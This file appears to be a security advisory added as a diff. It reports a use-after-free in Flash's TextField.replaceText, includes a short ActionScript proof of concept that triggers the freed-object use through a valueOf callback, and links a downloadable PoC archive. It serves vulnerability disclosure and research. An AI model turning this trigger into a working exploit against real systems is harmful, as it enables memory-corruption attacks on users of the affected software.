@@ -1,0 +1,27 @@
+Source: https://code.google.com/p/google-security-research/issues/detail?id=584
+
+There is a use-after-free in the TextField.replaceText function. If the function is called with a string parameter with toString defined, or an integer parameter with valueOf defined, the parent object of the TextField can be used after it is freed. Please note that all three parameters of this function are susceptible to this issue.
+
+A minimal PoC is as follows:
+
+var times = 0;
+var mc = this.createEmptyMovieClip("mc", 101);
+var tf = mc.createTextField("tf", 102, 1, 1, 100, 100);
+tf.replaceText( 1, 2, {valueOf : func});
+
+function func(){
+
+	mc.removeMovieClip();
+
+        // Fix heap here
+
+	return "text";
+	
+	}
+
+A sample swf and fla are attached.
+
+
+Proof of Concept:
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39048.zip
+
